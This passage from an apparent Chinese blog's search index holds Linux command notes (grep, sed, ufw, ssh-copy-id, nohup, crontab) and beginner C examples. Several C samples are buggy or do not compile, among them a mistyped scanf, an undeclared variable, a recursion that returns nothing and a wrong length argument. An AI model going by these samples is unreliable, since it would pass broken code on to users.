.|xargs grep -ri “SMS_ISSEND”\n查找目录下的所有文件中是否含有某个字符串,并且只打印出文件名\nfind .|xargs grep -ri “SMS_ISSEND” -l\n批量替换\nsed -i &quot;s/oldstring/newstring/g&quot; `grep oldstring -rl yourdir`\n\n防火墙 打开 关闭Debian原来用的是UFW防火墙，之前没接触过这种类型防火墙，懵逼了半天，这里记录一下简单的使用规则，后期在使用过程中慢慢完善UFW防火墙的使用操作方法；\n查看防火墙现有规则：\nufw status\n开启&#x2F;关闭防火墙：\nufw enable #开启ufw disable #关闭\n开启指定tcp或者udp端口：\nufw allow 22&#x2F;tcp\n同时开启tcp与udp端口：\nufw allow 445\n删除53端口：\nufw delete allow 53\n拒绝指定tcp或者udp端口：\nallow&#x2F;deny 20&#x2F;tcpallow&#x2F;deny 20&#x2F;udp\n突出显示的输出表示网络接口名称,它们通常被命名为eth0或enp3s2 \n因此，如果您的服务器具有名为eth0的公共网络接口，则可以使用以下命令允许HTTP流量（端口80 ）：\nsudo ufw allow in on eth0 to any port 80\n这样做将允许您的服务器从公共互联网接收HTTP请求或者，如果您希望MySQL数据库服务器（端口3306 ）监听专用网络接口eth1上的连接，例如，您可以使用此命令：\nsudo ufw allow in on eth1 to any port 3306\n这将允许专用网络上的其他服务器连接到MySQL数据库\n如何实现免密钥登录linuxssh-keygen # 生产密钥# 直接写入, 会造成服务器其他密钥的丢失scp ~/.ssh/id_rsa.pub root@*****:/root/.ssh/authorized_keys# 正确写入ssh-copy-id -i ~/.ssh/id_rsa.pub root@39.97.119.22\n\n然后即可免密钥登录远程了\nnohupnohup 命令运行由 Command参数和任何相关的 Arg参数指定的命令，忽略所有挂断（SIGHUP）信号。在注销后使用nohup 命令运行后台中的程序。要运行后台中的 nohup 命令，添加 &amp; （ 表示“and”的符号）到命令的尾部。nohup 是 no hang up 的缩写，就是不挂断的意思。nohup命令：如果你正在运行一个进程，而且你觉得在退出帐户时该进程还不会结束，那么可以使用nohup命令。该命令可以在你退出帐户&#x2F;关闭终端之后继续运行相应的进程。在缺省情况下该作业的所有输出都被重定向到一个名为nohup.out的文件中。回到顶部案例\n\nnohup command &gt; myout.file 2&gt;&amp;1 &amp;在上面的例子中，0 – stdin (standard input)，1 – stdout (standard output)，2 – stderr (standard error) ；2&gt;&amp;1是将标准错误（2）重定向到标准输出（&amp;1），标准输出（&amp;1）再被重定向输入到myout.file文件中。\n\n0 22 * * * &#x2F;usr&#x2F;bin&#x2F;python &#x2F;home&#x2F;pu&#x2F;download_pdf&#x2F;download_dfcf_pdf_to_oss.py &gt;&#x2F;home&#x2F;pu&#x2F;download_pdf&#x2F;download_dfcf_pdf_to_oss.log 2&gt;&amp;1\n\n\n这是放在crontab中的定时任务，晚上22点时候怕这个任务，启动这个python的脚本，并把日志写在download_dfcf_pdf_to_oss.log文件中回到顶部nohup和&amp;的区别\n&amp; ： 指在后台运行nohup ： 不挂断的运行，注意并没有后台运行的功能，，就是指，用nohup运行命令可以使命令永久的执行下去，和用户终端没有关系，例如我们断开SSH连接都不会影响他的运行，注意了nohup没有后台运行的意思；&amp;才是后台运行\n&amp;是指在后台运行，但当用户推出(挂起)的时候，命令自动也跟着退出那么，我们可以巧妙的吧他们结合起来用就是nohup COMMAND &amp;这样就能使命令永久的在后台执行例如：\n\nsh test.sh &amp;将sh test.sh任务放到后台 ，即使关闭xshell退出当前session依然继续运行，但标准输出和标准错误信息会丢失（缺少的日志的输出）\n\n将sh test.sh任务放到后台 ，关闭xshell，对应的任务也跟着停止。\n\nnohup sh test.sh将sh test.sh任务放到后台，关闭标准输入，终端不再能够接收任何输入（标准输入），重定向标准输出和标准错误到当前目录下的nohup.out文件，即使关闭xshell退出当前session依然继续运行。\nnohup sh test.sh  &amp;将sh test.sh任务放到后台，但是依然可以使用标准输入，终端能够接收任何输入，重定向标准输出和标准错误到当前目录下的nohup.out文件，即使关闭xshell退出当前session依然继续运行。\n\n配置dns服务器执行vim&#x2F;etc&#x2F;resolv.conf命令编辑/etc/resolv.conf文件\nvim /etc/resolv.conf\n\n格式:\nnameserver server_ip\n\n执行以下命令，验证文件系统域名是否可以解析到IP地址。\nnslookup\n更改磁盘名称e2label /dev/sdxN &lt;New Name&gt;\n\n","categories":["env"],"tags":["linux"]},{"title":"c基础","url":"/2019/09/21/dev/language/c/basic/","content":"C languagefor循环#include &lt;stdio.h&gt;int main()&#123;\tfor(double value=36;value&gt;0;value/=2)\tprintf(&quot;%3d&quot;,value);\treturn 0;&#125;\n\n\n\n\n\n打开文件#include &lt;stdio.h&gt;int main(void)&#123;\tchar line[10];\tFILE* source_file=fopen(&quot;test_01.c&quot;,&quot;r&quot;);\tchar* end;\tif(!source_file)\t&#123;\t\tprintf(&quot;Opne fali!&quot;);\t\treturn 0;\t&#125;\twhile(1)\t&#123;\tend=fgets(line,sizeof(line),source_file);\tif(end)\t&#123;\t printf(&quot;%s&quot;,line);\t&#125;\telse break;\t&#125;\treturn 0;&#125;\n\n\n\n斐波那契数列#include&lt;stdio.h&gt;int main(void)&#123;\t\t//实现斐波那契数列---2019.7.20\tint arr_length=0;\tint i_1=1,i_2=1,i_3=2;\tint i=0;\tprintf(&quot;Input a array length\\n&quot;);\tscanf(&quot;%d&quot;,&amp;arr_length);\tif(arr_length==3)\t\tprintf(&quot;%d %d %d\\n&quot;,i_1,i_2,i_3);\tif(arr_length==2)\t\tprintf(&quot;%d %d\\n&quot;,i_1,i_2);\tif(arr_length==1)\t\tprintf(&quot;%d\\n&quot;,i_1);\tif(arr_length&gt;=4)\t&#123;\t\t\tprintf(&quot;%d %d %d&quot;,i_1,i_2,i_3);\t\twhile(i&lt;(arr_length-3))\t\t&#123;\t\t\ti_1=i_2;\t\t\ti_2=i_3;\t\t\ti_3=i_1+i_2;\t\t\tprintf(&quot; %d&quot;,i_3);\t\t\ti++;\t\t&#125;\t\tprintf(&quot;\\n&quot;);\t&#125;\tif(arr_length&lt;=0)\tprintf(&quot;There is a error!\\n&quot;);\treturn 0;&#125;\n\n金字塔#include &lt;stdio.h&gt;\t//print Jin TAvoid Print(int line,char sign)&#123;\tfor(int i_1=line;i_1&gt;0;i_1--)\t&#123;\t\tfor(int i_2=0;i_2&lt;(i_1-1);i_2++)\t\t\tprintf(&quot; &quot;);\t\tfor(int i_3=0;i_3&lt;(2*(line-i_1+1)-1);i_3++)\t\t\tprintf(&quot;%c&quot;,sign);\t\tprintf(&quot;\\n&quot;);\t&#125;&#125;int main()&#123;\tPrint(25,&#x27;$&#x27;);\treturn 0;&#125;\n\n\n\n汉罗塔攻略#include &lt;stdio.h&gt;    //--------实现hannuota攻略程序int hannuota(int n,char A,char B,char C)&#123;\tif(n==1)&#123;\t\tprintf(&quot;Move %c to %c\\n&quot;,A,C);\t\treturn 0;\t&#125;\thannuota(n-1,A,C,B);\tprintf(&quot;Move %c to %c\\n&quot;,A,C);\thannuota(n-1,B,A,C);&#125;int main(void)&#123;\tint num=0;\tprintf(&quot;输入塔的个数\\n&quot;);\tscanf(&quot;%d&quot;,&amp;num);\thannuota(num,&#x27;A&#x27;,&#x27;B&#x27;,&#x27;C&#x27;);\treturn 0;&#125;\n\n递归累加递归函数来实现1+2+3+4+….+100\n#include&lt;stdio.h&gt;//使用递归函数来实现1+2+3+4+....+100int Plus(int num)&#123;\tif(num==1)&#123;\t\treturn ;\t&#125;\tPlus(num-1);&#125;int main(void)&#123;\tprintf(&quot;Please input a number to calculate\\n&quot;);\tscnaf(&quot;%d&quot;,&amp;num);\tPlus(num);\treturn 0;&#125;\n\n\n\n桶排序#include &lt;stdio.h&gt;char* Order(char* arr,int length)\t//桶排序&#123;\tint max=0;\tint i=0;\tprintf(&quot;%d&quot;,length);\twhile(i&lt;length)\t&#123;\t\tif(*(arr+i)&gt;max)\t\t&#123;\t\t\tmax=*(arr+i);\t\t&#125;\t\ti++;\t&#125;\tprintf(&quot;%d\\n&quot;,max);&#125;int main()&#123;\tchar arr[10]=&#123;1,34,32,34,11,3,35,67,89,22&#125;;\tOrder(arr,sizeof(int));\treturn 0;&#125;\n\n\n\n宏定义#include &lt;stdio.h&gt;void Define_Undef()&#123;\t#define A &quot;Hello&quot;\tprintf(A);\t#undef A\t#define A &quot; World\\n&quot;\tprintf(A);&#125;void Define_Compare()&#123;\t#define CMP(a,b) (a&gt;b?a:b)\tprintf(&quot;MAX: %d&quot;,CMP(1,2));&#125;void If_Endif_Elif()&#123;\t\t#define TURE 1\t#define FALSE 0\t#define MAX(num1,num2) (num1&gt;num2?TURE:FALSE)\t#define NUM 1\t#if NUM\tprintf(&quot;Hello!\\n&quot;);\t#endif\t#undef NUM\t#define NUM1 1\t#define NUM2 2\t#if MAX(NUM1,NUM2)\tprintf(&quot;%d &gt; %d \\n&quot;,NUM1,NUM2);\t#elif !(MAX(NUM1,NUM2))\tprintf(&quot;%d &lt; %d\\n&quot;,NUM1,NUM2);\t#endif&#125;void Ifdef_Else_Endif()&#123;//\t#define IF\t#ifdef IF\tprintf(&quot;IF has defined\\n&quot;);\t#else\tprintf(&quot;IF has not defined\\n&quot;);\t#endif&#125;void main()&#123;\t//Define_Undef();\t//Define_Compare();\t//If_Endif_Elif();\tIfdef_Else_Endif();&#125;\n\n\n\n位域bitfiled\n#include &lt;stdio.h&gt;typedef struct bs &#123;\tint a:2;\tint b:1;\tint c:12;\t\tunsigned d:4&#125;bs;struct bit_2 &#123;\tunsigned a:2;\tunsigned :2;  //It can&#x27;t use\tunsigned :0;  //NULL\tunsigned b:4;\tunsigned c:4;\t&#125;;int main(void) &#123;\tbs bit;\tprintf(&quot;sizeof(%d) \\n&quot;,sizeof(struct bs));\tbit.a = 4;\tbit.b = 1;\tbit.c = 34235;\tprintf(&quot;a: %d   b: %d  c: %d\\n&quot;, bit.a, bit.b, bit.c);\treturn 0;&#125;\n\n","categories":["language"],"tags":["c"]}]